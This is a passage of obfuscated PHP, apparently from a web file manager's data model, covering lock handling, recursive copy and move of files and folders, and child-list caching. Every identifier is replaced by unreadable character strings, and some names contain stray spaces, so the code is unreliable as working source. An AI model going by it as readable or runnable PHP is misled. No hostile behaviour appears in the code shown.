$this->_lockEvent($Õƒ…şÂè, array($·¶Ó§éŠ[619], $·¶Ó§éŠ[620]), $Ì™ˆŞÜù); $this->_lockParent($Õƒ…şÂè, array($·¶Ó§éŠ[620]), $Ì™ˆŞÜù); $this->_lockEvent($Õƒ…şÂè, array($·¶Ó§éŠ[621], $·¶Ó§éŠ[622]), $Ì™ˆŞÜù); } public function lockWriteStart($­¶¶ÁÒº, $ıÈ¾öç = '') { $Â¿€£†† =& $_SERVER[Ùæõ‰Ï’]; if (!$this->allowLock()) { return; } $this->_lockCheck($Â¿€£††[619], $­¶¶ÁÒº); $ÆıÍãÅí = 1; $this->_lockKey($Â¿€£††[623] . $­¶¶ÁÒº . $Â¿€£††[10] . $ıÈ¾öç, $ÆıÍãÅí); $this->_lockEvent($­¶¶ÁÒº, array($Â¿€£††[618], $Â¿€£††[620]), $ÆıÍãÅí); $this->_lockParent($­¶¶ÁÒº, array($Â¿€£††[618], $Â¿€£††[620]), $ÆıÍãÅí); $this->_lockCheckEnd($Â¿€£††[619], $­¶¶ÁÒº); } public function lockWriteEnd($Ò…œÎÀØ, $”Ûµ•ï = '') { $ã¨×Ø‘ü =& $_SERVER[Ùæõ‰Ï’]; if (!$this->allowLock()) { return; } $š˜ßòçÊ = 0; $this->_lockKey($ã¨×Ø‘ü[623] . $Ò…œÎÀØ . $ã¨×Ø‘ü[10] . $”Ûµ•ï, $š˜ßòçÊ); $this->_lockEvent($Ò…œÎÀØ, array($ã¨×Ø‘ü[618], $ã¨×Ø‘ü[620]), $š˜ßòçÊ); $this->_lockParent($Ò…œÎÀØ, array($ã¨×Ø‘ü[618], $ã¨×Ø‘ü[620]), $š˜ßòçÊ); } public function lockMoveStart($¶Ş”Øë) { $×›ß—… =& $_SERVER[Ùæõ‰Ï’]; if (!$this->allowLock()) { return; } $this->_lockCheck($×›ß—…[620], $¶Ş”Øë); $Ô©©Í = 1; $this->_lockKey($×›ß—…[624] . $¶Ş”Øë, $Ô©©Í); $this->_lockEvent($¶Ş”Øë, array($×›ß—…[618], $×›ß—…[619]), $Ô©©Í); $this->_lockParent($¶Ş”Øë, array($×›ß—…[618], $×›ß—…[620]), $Ô©©Í); $this->_lockEvent($¶Ş”Øë, array($×›ß—…[625], $×›ß—…[621], $×›ß—…[622]), $Ô©©Í); $this->_lockCheckEnd($×›ß—…[620], $¶Ş”Øë); } public function lockMoveEnd($Éš”Ş˜) { $ÕıŞ” =& $_SERVER[Ùæõ‰Ï’]; if (!$this->allowLock()) { return; } $Í¡¿¶ = 0; $this->_lockKey($ÕıŞ”[624] . $Éš”Ş˜, $Í¡¿¶); $this->_lockEvent($Éš”Ş˜, array($ÕıŞ”[618], $ÕıŞ”[619]), $Í¡¿¶); $this->_lockParent($Éš”Ş˜, array($ÕıŞ”[618], $ÕıŞ”[620]), $Í¡¿¶); $this->_lockEvent($Éš”Ş˜, array($ÕıŞ”[625], $ÕıŞ”[621], $ÕıŞ”[622]), $Í¡¿¶); } private function _lockCheck($ÛË–ÂÒØ, $Œµ•œÕ°) { $˜È¸ú•Ã =& $_SERVER[Ùæõ‰Ï’]; $šœ¶Îó = $this->sourceInfo($Œµ•œÕ°); $ÜŸÒ¡Ç± = $ÛË–ÂÒØ . $˜È¸ú•Ã[10] . $Œµ•œÕ°; $this->_lockTimeStart[$ÜŸÒ¡Ç±] = timeFloat(); if (!is_array($šœ¶Îó)) { return; } $Ú‡¦ÂŞ® = LNG($˜È¸ú•Ã[626]); CacheLock::setErrorMsg($˜È¸ú•Ã[176] . htmlspecialchars($šœ¶Îó[$˜È¸ú•Ã[32]]) . $˜È¸ú•Ã[178] . $Ú‡¦ÂŞ®); $this->_lockKey($ÜŸÒ¡Ç±, 1); $this->_lockKey($ÜŸÒ¡Ç±, 0); $¾£‹”›û = array_reverse($this->parentLevelArray($šœ¶Îó[$˜È¸ú•Ã[584]])); foreach ($¾£‹”›û as $ˆ„í²–) { $ÜŸÒ¡Ç± = $ÛË–ÂÒØ . $˜È¸ú•Ã[627] . $ˆ„í²–; if (CacheLock::lockGet($˜È¸ú•Ã[628] . $ÜŸÒ¡Ç±)) { $šœ¶Îó = $this->sourceInfo($ˆ„í²–); CacheLock::setErrorMsg($˜È¸ú•Ã[176] . htmlspecialchars($šœ¶Îó[$˜È¸ú•Ã[32]]) . $˜È¸ú•Ã[178] . $Ú‡¦ÂŞ®); $this->_lockKey($ÜŸÒ¡Ç±, 1); $this->_lockKey($ÜŸÒ¡Ç±, 0); } } } private function _lockCheckEnd($ã¥´¤‡, $ğ‡µ²ü) { $×ØÅİÙÇ =& $_SERVER[Ùæõ‰Ï’]; $ãÂìÅÀ­ = $ã¥´¤‡ . $×ØÅİÙÇ[10] . $ğ‡µ²ü; CacheLock::setErrorMsg($×ØÅİÙÇ[454]); if (!isset($this->_lockTimeStart[$ãÂìÅÀ­])) { return; } $ŠÌ¹Öø = timeFloat() - $this->_lockTimeStart[$ãÂìÅÀ­]; unset($this->_lockTimeStart[$ãÂìÅÀ­]); if ($ŠÌ¹Öø > 0.5) { unset(self::$cacheSourceInfo[$×ØÅİÙÇ[533] . $ğ‡µ²ü]); } $£„²¨ìÊ = $this->sourceInfo($ğ‡µ²ü); if (!$£„²¨ìÊ) { show_json(LNG($×ØÅİÙÇ[108]), !1); } } private function _lockParent($¢ÔœúÈ’, $Şİ›ã©, $ï…Õúƒ—) { if (!$this->autoLockSet) { return; } $ûÌâÈõ = $this->sourceInfo($¢ÔœúÈ’); if (!is_array($ûÌâÈõ)) { return; } $‡¥´ú€ = array_reverse($this->parentLevelArray($ûÌâÈõ[$_SERVER[Ùæõ‰Ï’][584]])); foreach ($‡¥´ú€ as $²Œ±Á¼) { $this->_lockEvent($²Œ±Á¼, $Şİ›ã©, $ï…Õúƒ—); } } private function _lockEvent($¨¸ÕÚ½‡, $£Óğ Œ, $ıí®ù’º) { $Ñğá¤’ =& $_SERVER[Ùæõ‰Ï’]; if (!$this->autoLockSet) { return; } foreach ($£Óğ Œ as $Á·Ò¡æ) { $’°ÑíÑ = $Á·Ò¡æ . $Ñğá¤’[10] . $¨¸ÕÚ½‡; if ($ıí®ù’º && CacheLock::lockGet($Ñğá¤’[628] . $’°ÑíÑ)) { continue; } $this->_lockKey($’°ÑíÑ, $ıí®ù’º); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($‚¾áõ›Ê, $ÉËÁ—« = 1) { $û«§¯î = $_SERVER[Ùæõ‰Ï’][628] . md5($‚¾áõ›Ê); if ($ÉËÁ—«) { if (isset(self::$_lockItemArr[$û«§¯î])) { return; } self::$_lockItemArr[$û«§¯î] = 1; CacheLock::lock($û«§¯î, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$û«§¯î])) { return; } unset(self::$_lockItemArr[$û«§¯î]); CacheLock::unlock($û«§¯î); } } public function isParentOf($øŞ®°¼Æ, $—Á÷Àõ) { $²ŸøœË” =& $_SERVER[Ùæõ‰Ï’]; $‘ğØ¨† = $this->sourceInfo($øŞ®°¼Æ); $Ç„’µÉ© = $this->sourceInfo($—Á÷Àõ); $ˆÓ°Îä = $‘ğØ¨†[$²ŸøœË”[584]] . $‘ğØ¨†[$²ŸøœË”[193]] . $²ŸøœË”[50]; $åëúÄ¼ = $Ç„’µÉ©[$²ŸøœË”[584]] . $Ç„’µÉ©[$²ŸøœË”[193]] . $²ŸøœË”[50]; $”ÍÎÄ¥Ï = strpos($åëúÄ¼, $ˆÓ°Îä) === 0; return $”ÍÎÄ¥Ï; } private $targetIsDelete = 0; public function copy($¤£’è®€, $ø÷‡Áºå, $Æš†÷´Ã = REPEAT_REPLACE, $ŠûÊ‘Œ£ = '') { $‡µšà†¾ =& $_SERVER[Ùæõ‰Ï’]; $Ûöôöà = $this->sourceInfo($¤£’è®€); $ –ùÑ‰» = $this->sourceInfo($ø÷‡Áºå); if (!$Ûöôöà || !$ –ùÑ‰» || $ –ùÑ‰»[$‡µšà†¾[485]] != $‡µšà†¾[91]) { return !1; } if ($this->isParentOf($¤£’è®€, $ø÷‡Áºå)) { return !1; } $áºœÎˆò = $ŠûÊ‘Œ£ ? $ŠûÊ‘Œ£ : $Ûöôöà[$‡µšà†¾[32]]; $this->lockCopyStart($¤£’è®€); $this->lockWriteStart($ø÷‡Áºå, $áºœÎˆò); $ùÍ÷‹…á = array($‡µšà†¾[629] => array(), $‡µšà†¾[630] => array(), $‡µšà†¾[631] => array()); $this->targetIsDelete = intval($Ûöôöà[$‡µšà†¾[505]]); $¶…ÔÜ¥ = $this->fileNameExistAuto($ø÷‡Áºå, $Ûöôöà); $±øŸ–¿¹ = $this->_copy($¤£’è®€, $ø÷‡Áºå, $Æš†÷´Ã, $ùÍ÷‹…á, !0, $ŠûÊ‘Œ£); $this->_childrenListClear(); $this->lockCopyEnd($¤£’è®€); $this->lockWriteEnd($ø÷‡Áºå, $áºœÎˆò); if ($Ûöôöà[$‡µšà†¾[485]] == $‡µšà†¾[91] && $¶…ÔÜ¥ == $±øŸ–¿¹) { $this->folderSizeResetChildren($¶…ÔÜ¥); } Model($‡µšà†¾[632])->addAll($ùÍ÷‹…á[$‡µšà†¾[630]], array(), !0); if ($¶…ÔÜ¥ != $±øŸ–¿¹ || $Ûöôöà[$‡µšà†¾[485]] == $‡µšà†¾[91]) { Model($‡µšà†¾[633])->eventCopy($±øŸ–¿¹); } $this->saveAll($ùÍ÷‹…á[$‡µšà†¾[631]]); Model($‡µšà†¾[230])->linkAdd($ùÍ÷‹…á[$‡µšà†¾[629]]); $this->folderSizeReset($ø÷‡Áºå); $this->updateModifyTime($ø÷‡Áºå); return $±øŸ–¿¹; } private function _copy($‡°Ÿß‰ò, $şöàÒ«Ö, $ù™Â…€Ì, &$™ıóî€, $¤õé«ì©, $ñÑ´†—ñ = '') { $Ú½¾êö¡ =& $_SERVER[Ùæõ‰Ï’]; $Î¤¢İ‹ = $this->sourceInfoCache($‡°Ÿß‰ò); $”÷ï°é = $Î¤¢İ‹[$Ú½¾êö¡[485]] == $Ú½¾êö¡[91]; $şè¹Ş×Œ = $ñÑ´†—ñ ? $ñÑ´†—ñ : $Î¤¢İ‹[$Ú½¾êö¡[32]]; $ÃçËõ‹ë = $this->fileNameExistAuto($şöàÒ«Ö, $Î¤¢İ‹); if ($¤õé«ì©) { $this->_childrenAllMake($‡°Ÿß‰ò); if ($”÷ï°é && $ÃçËõ‹ë) { $this->_childrenAllMake($ÃçËõ‹ë); } } if (!$ÃçËõ‹ë) { return $this->_copyCreate($‡°Ÿß‰ò, $şöàÒ«Ö, $şè¹Ş×Œ, $™ıóî€); } $áÍ¢æ°ù = $ÃçËõ‹ë; if ($”÷ï°é) { if ($ù™Â…€Ì == REPEAT_RENAME_FOLDER) { $şè¹Ş×Œ = $this->fileNameAutoCache($şöàÒ«Ö, $şè¹Ş×Œ, $ù™Â…€Ì, $”÷ï°é); $áÍ¢æ°ù = $this->_copyCreate($‡°Ÿß‰ò, $şöàÒ«Ö, $şè¹Ş×Œ, $™ıóî€); } else { $¶÷ï«ôÈ = $this->_childrenList($‡°Ÿß‰ò); foreach ($¶÷ï«ôÈ as $•Òú®”‹) { $this->_copy($•Òú®”‹[$Ú½¾êö¡[193]], $ÃçËõ‹ë, $ù™Â…€Ì, $™ıóî€, !1); } } } else { if ($ù™Â…€Ì == REPEAT_RENAME || $ù™Â…€Ì == REPEAT_RENAME_FOLDER) { $şè¹Ş×Œ = $this->fileNameAutoCache($şöàÒ«Ö, $şè¹Ş×Œ, $ù™Â…€Ì, $”÷ï°é); $áÍ¢æ°ù = $this->_copyCreate($‡°Ÿß‰ò, $şöàÒ«Ö, $şè¹Ş×Œ, $™ıóî€); } else { if ($ù™Â…€Ì == REPEAT_REPLACE) { $Ê‚¡“Êø = $this->sourceInfoCache($ÃçËõ‹ë); $ıÆëÛ¤ = $this->fileHistory($Ê‚¡“Êø, $Î¤¢İ‹[$Ú½¾êö¡[541]], $Î¤¢İ‹[$Ú½¾êö¡[79]]); if ($ıÆëÛ¤) { $™ıóî€[$Ú½¾êö¡[629]][] = $Î¤¢İ‹[$Ú½¾êö¡[541]]; } } else { if ($ù™Â…€Ì == REPEAT_SKIP) { } } } Hook::trigger($Ú½¾êö¡[634], array($Ú½¾êö¡[635], $Î¤¢İ‹, 0)); } return $áÍ¢æ°ù; } private function _copyCreate($æøîÄ´º, $¬Û×®Î¹, $ÁùÆŒûº, &$»šˆà³†) { $æ˜¥È¦Ö =& $_SERVER[Ùæõ‰Ï’]; $‰»Ó·À£ = $this->sourceInfoCache($æøîÄ´º); $ŸíÑÌ† = $this->sourceInfoCache($¬Û×®Î¹); $¥ˆèá‰Ñ = $this->_makeItemData($‰»Ó·À£, $ŸíÑÌ†, $ÁùÆŒûº); Hook::trigger($æ˜¥È¦Ö[636], $¥ˆèá‰Ñ); Hook::trigger($æ˜¥È¦Ö[637], array($æ˜¥È¦Ö[638], $¥ˆèá‰Ñ, 0)); $…ø­Ğ´ü = $this->add($¥ˆèá‰Ñ); $éÊ¿ËØÎ = array($æ˜¥È¦Ö[193] => $…ø­Ğ´ü, $æ˜¥È¦Ö[32] => $ÁùÆŒûº); $this->_copyApplyMeta($éÊ¿ËØÎ, $»šˆà³†); if ($‰»Ó·À£[$æ˜¥È¦Ö[485]] != $æ˜¥È¦Ö[91]) { $»šˆà³†[$æ˜¥È¦Ö[629]][] = $‰»Ó·À£[$æ˜¥È¦Ö[541]]; return $…ø­Ğ´ü; } $Ä·¤¾şÖ = array(); $ÃĞ­’¹ğ = array(); $this->_childrenListAll($æøîÄ´º, $Ä·¤¾şÖ); $–óŒµŞŞ = count($Ä·¤¾şÖ); if ($–óŒµŞŞ == 0) { return $…ø­Ğ´ü; } $ıİßŞ³× = $this->sourceInfo($…ø­Ğ´ü); foreach ($Ä·¤¾şÖ as $ù¥Öñ–) { $Î¡˜¨Ì³ = $this->_makeItemData($ù¥Öñ–, $ıİßŞ³×, $ù¥Öñ–[$æ˜¥È¦Ö[32]]); $Î¡˜¨Ì³[$æ˜¥È¦Ö[584]] = $ù¥Öñ–[$æ˜¥È¦Ö[584]]; $ÃĞ­’¹ğ[] = $Î¡˜¨Ì³; } $this->chunkEventSet($æ˜¥È¦Ö[639], array($æ˜¥È¦Ö[640], $¥ˆèá‰Ñ, $–óŒµŞŞ)); $this->addAll($ÃĞ­’¹ğ, array(), !1); $Äè´±æ = $this->where(array($æ˜¥È¦Ö[192] => $…ø­Ğ´ü))->select(); $š““­ = $this->_childrenMakeRelation($Ä·¤¾şÖ, $Äè´±æ); $š““­[$æøîÄ´º] = $…ø­Ğ´ü; $¡¦ÏÉ·  = array(); $•Öç§Ÿ‘ = array(); foreach ($Äè´±æ as $ù¥Öñ–) { $ç¤œõŸ© = $ù¥Öñ–[$æ˜¥È¦Ö[193]]; $ù¼ã‡„„ = $this->_childrenMatch($š““­, $ù¥Öñ–, $ıİßŞ³×); $¡¦ÏÉ· [] = array($æ˜¥È¦Ö[193], $ç¤œõŸ©, $æ˜¥È¦Ö[192], $ù¼ã‡„„[$æ˜¥È¦Ö[192]]); $•Öç§Ÿ‘[] = array($æ˜¥È¦Ö[193], $ç¤œõŸ©, $æ˜¥È¦Ö[584], $ù¼ã‡„„[$æ˜¥È¦Ö[584]]); $this->_copyApplyMeta($ù¥Öñ–, $»šˆà³†); if ($ù¥Öñ–[$æ˜¥È¦Ö[485]] != $æ˜¥È¦Ö[91]) { $»šˆà³†[$æ˜¥È¦Ö[629]][] = $ù¥Öñ–[$æ˜¥È¦Ö[541]]; } } $this->chunkEventSet($æ˜¥È¦Ö[641], array($æ˜¥È¦Ö[642], $¥ˆèá‰Ñ, $–óŒµŞŞ)); $this->saveAll($¡¦ÏÉ· ); $this->chunkEventSet($æ˜¥È¦Ö[643], array($æ˜¥È¦Ö[644], $¥ˆèá‰Ñ, $–óŒµŞŞ)); $this->saveAll($•Öç§Ÿ‘); return $…ø­Ğ´ü; } private function _childrenMakeRelation($ûÎî•—ƒ, $›Àó¦Ó ) { $—æŠÁ”Î =& $_SERVER[Ùæõ‰Ï’]; $ö©í¼‚½ = array(); $èØäã‡ = array(); foreach ($ûÎî•—ƒ as $Ñí«Ö†) { $ŒÔ¹Üô = $Ñí«Ö†[$—æŠÁ”Î[32]] . $—æŠÁ”Î[8] . $Ñí«Ö†[$—æŠÁ”Î[584]]; $ö©í¼‚½[$ŒÔ¹Üô] = $Ñí«Ö†[$—æŠÁ”Î[193]]; } foreach ($›Àó¦Ó  as $Ñí«Ö†) { $ŒÔ¹Üô = $Ñí«Ö†[$—æŠÁ”Î[32]] . $—æŠÁ”Î[8] . $Ñí«Ö†[$—æŠÁ”Î[584]]; $Ş¿š‡²™ = $ö©í¼‚½[$ŒÔ¹Üô]; $èØäã‡[$Ş¿š‡²™] = $Ñí«Ö†[$—æŠÁ”Î[193]]; } return $èØäã‡; } private function _childrenMatch($ËµŞ”, $ğŸ½ÅÕØ, $²’ß•›Ç) { $ôïÚİ¦ =& $_SERVER[Ùæõ‰Ï’]; $±òÉÂË = $²’ß•›Ç[$ôïÚİ¦[584]]; $Úøä’¥Ï = $this->parentLevelArray($ğŸ½ÅÕØ[$ôïÚİ¦[584]]); foreach ($Úøä’¥Ï as $„–âµ›) { if (isset($ËµŞ”[$„–âµ›])) { $±òÉÂË .= $ËµŞ”[$„–âµ›] . $ôïÚİ¦[645]; } } $±òÉÂË = rtrim($±òÉÂË, $ôïÚİ¦[50]) . $ôïÚİ¦[50]; $ùßıõÁ¥ = $this->parentLevelArray($±òÉÂË); $åª¶€¢ = $ùßıõÁ¥[count($ùßıõÁ¥) - 1]; return array($ôïÚİ¦[192] => $åª¶€¢, $ôïÚİ¦[584] => $±òÉÂË); } private function _makeItemData($€äÍ©”“, $¬À•Æ´, $é¡í“ñ¹) { $‚à¿‹ÎÚ =& $_SERVER[Ùæõ‰Ï’]; $ÍÅäÜ®ç = array($‚à¿‹ÎÚ[646] => $€äÍ©”“[$‚à¿‹ÎÚ[485]], $‚à¿‹ÎÚ[494] => $é¡í“ñ¹, $‚à¿‹ÎÚ[647] => $€äÍ©”“[$‚à¿‹ÎÚ[486]] ? $€äÍ©”“[$‚à¿‹ÎÚ[486]] : $‚à¿‹ÎÚ[12], $‚à¿‹ÎÚ[542] => $€äÍ©”“[$‚à¿‹ÎÚ[541]] ? $€äÍ©”“[$‚à¿‹ÎÚ[541]] : 0, $‚à¿‹ÎÚ[617] => $€äÍ©”“[$‚à¿‹ÎÚ[79]] ? $€äÍ©”“[$‚à¿‹ÎÚ[79]] : 0, $‚à¿‹ÎÚ[648] => intval($¬À•Æ´[$‚à¿‹ÎÚ[190]]), $‚à¿‹ÎÚ[649] => intval($¬À•Æ´[$‚à¿‹ÎÚ[569]]), $‚à¿‹ÎÚ[650] => intval(USER_ID), $‚à¿‹ÎÚ[651] => intval(USER_ID), $‚à¿‹ÎÚ[477] => intval($¬À•Æ´[$‚à¿‹ÎÚ[193]]), $‚à¿‹ÎÚ[652] => $¬À•Æ´[$‚à¿‹ÎÚ[584]] . $¬À•Æ´[$‚à¿‹ÎÚ[193]] . $‚à¿‹ÎÚ[50], $‚à¿‹ÎÚ[498] => $€äÍ©”“[$‚à¿‹ÎÚ[88]] ? $€äÍ©”“[$‚à¿‹ÎÚ[88]] : time(), $‚à¿‹ÎÚ[504] => 0, $‚à¿‹ÎÚ[653] => $‚à¿‹ÎÚ[12]); return $ÍÅäÜ®ç; } private function _copyApplyMeta($ß×Ğ¼¡, &$Ù“ãÊß) { $„Ş‚õÂ =& $_SERVER[Ùæõ‰Ï’]; $µ“í ‰Š = $ß×Ğ¼¡[$„Ş‚õÂ[193]]; $‹«Ü¬„ä = $ß×Ğ¼¡[$„Ş‚õÂ[32]]; if (!isset($ß×Ğ¼¡[$„Ş‚õÂ[654]]) || !$ß×Ğ¼¡[$„Ş‚õÂ[654]] || $ß×Ğ¼¡[$„Ş‚õÂ[654]] == $„Ş‚õÂ[228]) { $Ù“ãÊß[$„Ş‚õÂ[631]][] = array($„Ş‚õÂ[193], $µ“í ‰Š, $„Ş‚õÂ[654], short_id($µ“í ‰Š)); } if (Input::check($‹«Ü¬„ä, $„Ş‚õÂ[655])) { $Ù“ãÊß[$„Ş‚õÂ[630]][] = array($„Ş‚õÂ[193] => $µ“í ‰Š, $„Ş‚õÂ[97] => $„Ş‚õÂ[538], $„Ş‚õÂ[450] => str_replace($„Ş‚õÂ[53], $„Ş‚õÂ[12], Pinyin::get($‹«Ü¬„ä))); $Ù“ãÊß[$„Ş‚õÂ[630]][] = array($„Ş‚õÂ[193] => $µ“í ‰Š, $„Ş‚õÂ[97] => $„Ş‚õÂ[537], $„Ş‚õÂ[450] => Pinyin::get($‹«Ü¬„ä, $„Ş‚õÂ[656])); } $Ù“ãÊß[$„Ş‚õÂ[630]][] = array($„Ş‚õÂ[193] => $µ“í ‰Š, $„Ş‚õÂ[97] => $„Ş‚õÂ[517], $„Ş‚õÂ[450] => KodSort::makeStr($‹«Ü¬„ä)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¶ïë¸ğã) { $Û†­œØ =& $_SERVER[Ùæõ‰Ï’]; $¸„é•¶¢ = $this->sourceInfo($¶ïë¸ğã); $ª¬°Ï‚• = $Û†­œØ[657]; $ˆøªÛîÏ = array($Û†­œØ[584] => array($Û†­œØ[612], $¸„é•¶¢[$Û†­œØ[584]] . $¶ïë¸ğã . $Û†­œØ[613]), $Û†­œØ[505] => $this->targetIsDelete); $êíµƒ = $this->field($ª¬°Ï‚•)->where($ˆøªÛîÏ)->select(); if (!$êíµƒ) { return; } $êíµƒ = array_to_keyvalue($êíµƒ, $Û†­œØ[193]); foreach ($êíµƒ as $÷¼˜…í•) { $‡ğ•±‘ş = $÷¼˜…í•[$Û†­œØ[192]]; $¶ïë¸ğã = $÷¼˜…í•[$Û†­œØ[193]]; if (!isset($this->_childrenListCache[$¶ïë¸ğã]) && $÷¼˜…í•[$Û†­œØ[485]] == $Û†­œØ[91]) { $this->_childrenListCache[$¶ïë¸ğã] = array(); } if (!isset($this->_childrenListCache[$‡ğ•±‘ş])) { $this->_childrenListCache[$‡ğ•±‘ş] = array(); } $this->_childrenListCache[$‡ğ•±‘ş][$¶ïë¸ğã] = $÷¼˜…í•; $this->_childrenItemCache[$¶ïë¸ğã] = $÷¼˜…í•; } } private function _childrenListAll($ì«í‘Ğ, &$ĞüøÉ) { $»ÍÏîÇê =& $_SERVER[Ùæõ‰Ï’]; if (!isset($this->_childrenListCache[$ì«í‘Ğ])) { return; } $ÜùÌÉÜà = $this->_childrenListCache[$ì«í‘Ğ]; foreach ($ÜùÌÉÜà as $Åš³§ãˆ => $ºÌ¥‰˜) { $ĞüøÉ[$Åš³§ãˆ] = $ºÌ¥‰˜; if ($ºÌ¥‰˜[$»ÍÏîÇê[485]] == $»ÍÏîÇê[91]) { $this->_childrenListAll($Åš³§ãˆ, $ĞüøÉ); } } } private function sourceInfoCache($¢ü Åø) { if (isset($this->_childrenItemCache[$¢ü Åø])) { return $this->_childrenItemCache[$¢ü Åø]; } return $this->sourceInfo($¢ü Åø); } private function _childrenList($¦¶ŸÃºÎ) { if (isset($this->_childrenListCache[$¦¶ŸÃºÎ])) { return $this->_childrenListCache[$¦¶ŸÃºÎ]; } return $this->_childrenListSelect($¦¶ŸÃºÎ); } private function _childrenListSelect($Ë§ïàúÌ) { $°„˜âåÒ =& $_SERVER[Ùæõ‰Ï’]; $Úùº±† = array($°„˜âåÒ[192] => $Ë§ïàúÌ, $°„˜âåÒ[505] => $this->targetIsDelete); $¸ËáÛƒ³ = $this->where($Úùº±†)->select(); $¸ËáÛƒ³ = $¸ËáÛƒ³ ? $¸ËáÛƒ³ : array(); $–¨Ÿ«Û = array_to_keyvalue($¸ËáÛƒ³, $°„˜âåÒ[193]); $this->_childrenListCache[$Ë§ïàúÌ] = $–¨Ÿ«Û; foreach ($–¨Ÿ«Û as $Ë§ïàúÌ => $àå ‹Êî) { $this->_childrenItemCache[$Ë§ïàúÌ] = $àå ‹Êî; } return $–¨Ÿ«Û; } private function fileNameExistAuto($ûï÷ó×ú, $Š“Î˜ë) { $ñ·‚ı‚ =& $_SERVER[Ùæõ‰Ï’]; if ($Š“Î˜ë[$ñ·‚ı‚[505]] == $ñ·‚ı‚[91]) { return $this->fileNameExist($ûï÷ó×ú, $Š“Î˜ë[$ñ·‚ı‚[32]]); } return $this->fileNameExistCache($ûï÷ó×ú, $Š“Î˜ë[$ñ·‚ı‚[32]]); } private function fileNameExistCache($êÕŒĞÑ, $“çĞ¼´Ò) { $ Ÿâí½œ =& $_SERVER[Ùæõ‰Ï’]; $“çĞ¼´Ò = strtolower($“çĞ¼´Ò); $¤Œ¢½‰’ = $this->_childrenList($êÕŒĞÑ); foreach ($¤Œ¢½‰’ as $¡Â±…Å») { if ($“çĞ¼´Ò == strtolower($¡Â±…Å»[$ Ÿâí½œ[32]])) { return $¡Â±…Å»[$ Ÿâí½œ[193]]; } } return !1; } private function fileNameAutoCache($îãî¯”®, $¡¨Ïé¾³, $Öº¤ò•ş, $Ê«ßíÈğ) { $°Õ†ÑÕÑ =& $_SERVER[Ùæõ‰Ï’]; $¬ÉŒªÃ† = $this->_childrenList($îãî¯”®); $ê®öòŒ£ = array_to_keyvalue($¬ÉŒªÃ†, $°Õ†ÑÕÑ[12], $°Õ†ÑÕÑ[32]); return $this->fileNameAutoGet($ê®öòŒ£, $¡¨Ïé¾³, $Öº¤ò•ş, $Ê«ßíÈğ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ä—ñÔäÎ, $¡óİü×Ú, $è¿èëºÉ = REPEAT_REPLACE, $‘‚¢œ¡ = '') { $½êúÚçˆ =& $_SERVER[Ùæõ‰Ï’]; $—ƒ¼´£ = $this->sourceInfo($Ä—ñÔäÎ); $åĞòªŠ« = $this->sourceInfo($¡óİü×Ú); if ($—ƒ¼´£[$½êúÚçˆ[192]] == $åĞòªŠ«[$½êúÚçˆ[193]]) { if ($—ƒ¼´£[$½êúÚçˆ[505]] == $½êúÚçˆ[91]) { Model($½êúÚçˆ[503])->restore(array($Ä—ñÔäÎ)); } if (!$‘‚¢œ¡ || $‘‚¢œ¡ == $—ƒ¼´£[$½êúÚçˆ[32]]) { return $Ä—ñÔäÎ; } } $óñİÈ½î = $this->pathInfoMore($Ä—ñÔäÎ); if ($this->isParentOf($Ä—ñÔäÎ, $¡óİü×Ú)) { return !1; } if (!$—ƒ¼´£ || !$åĞòªŠ« || $åĞòªŠ«[$½êúÚçˆ[485]] != $½êúÚçˆ[91]) { return !1; } Hook::trigger($½êúÚçˆ[658], $óñİÈ½î); $this->targetIsDelete = intval($—ƒ¼´£[$½êúÚçˆ[505]]); if ($—ƒ¼´£[$½êúÚçˆ[192]] == $¡óİü×Ú && $‘‚¢œ¡ != $—ƒ¼´£[$½êúÚçˆ[32]]) { $³Ú™¿‚Æ = $this->fileNameExist($¡óİü×Ú, $‘‚¢œ¡); if ($³Ú™¿‚Æ && $—ƒ¼´£[$½êúÚçˆ[485]] == $½êúÚçˆ[228]) { $×‘¸ß¦í = $this->sourceInfo($³Ú™¿‚Æ); $×¶•¸ü™ = $this->fileHistory($×‘¸ß¦í, $—ƒ¼´£[$½êúÚçˆ[541]], $—ƒ¼´£[$½êúÚçˆ[79]]); if (!$×¶•¸ü™) { Model($½êúÚçˆ[544])->remove($—ƒ¼´£[$½êúÚçˆ[541]]); } $this->removeNow($Ä—ñÔäÎ, !1); $this->folderSizeReset($¡óİü×Ú); Hook::trigger($½êúÚçˆ[659], $óñİÈ½î); return $³Ú™¿‚Æ; } } $œÜÇÎ…» = $‘‚¢œ¡ ? $‘‚¢œ¡ : $—ƒ¼´£[$½êúÚçˆ[32]]; $this->lockMoveStart($Ä—ñÔäÎ); $this->lockWriteStart($¡óİü×Ú, $œÜÇÎ…»); $›™¬‹À° = array($½êúÚçˆ[629] => array(), $½êúÚçˆ[660] => !1); $this->clearShare($Ä—ñÔäÎ, $¡óİü×Ú); $ü»ùµ­ = $this->fileNameExistAuto($¡óİü×Ú, $—ƒ¼´£); $Öùìıù² = $this->_move($Ä—ñÔäÎ, $¡óİü×Ú, $è¿èëºÉ, $›™¬‹À°, $‘‚¢œ¡); $this->sourceCacheClear(); if ($—ƒ¼´£[$½êúÚçˆ[485]] == $½êúÚçˆ[91] && $ü»ùµ­) { $this->folderSizeResetChildren($Öùìıù²); } Model($½êúÚçˆ[230])->linkAdd($›™¬‹À°[$½êúÚçˆ[629]]); if ($ü»ùµ­ && $›™¬‹À°[$½êúÚçˆ[660]]) { $this->removeNow($Ä—ñÔäÎ, !1); } $this->lockMoveEnd($Ä—ñÔäÎ); $this->lockWriteEnd($¡óİü×Ú, $œÜÇÎ…»); $this->folderSizeReset($—ƒ¼´£[$½êúÚçˆ[192]]); $this->folderSizeReset($¡óİü×Ú); $¤¤Ùâõš = array($—ƒ¼´£[$½êúÚçˆ[192]], $¡óİü×Ú); if ($—ƒ¼´£[$½êúÚçˆ[485]] == $½êúÚçˆ[91]) { $¤¤Ùâõš[] = $Ä—ñÔäÎ; } $this->updateModifyTime($¤¤Ùâõš); Model($½êúÚçˆ[633])->eventMove($Ä—ñÔäÎ, $—ƒ¼´£[$½êúÚçˆ[192]], $¡óİü×Ú); Hook::trigger($½êúÚçˆ[659], $óñİÈ½î); return $Öùìıù²; } private function _move($°·—¹´¨, $òÅÏ‚Å®, $­±˜Ò³, &$•¢ß†ì, $ûãÛ®òı = '') { $ÀÊ¡¤ŞÆ =& $_SERVER[Ùæõ‰Ï’]; 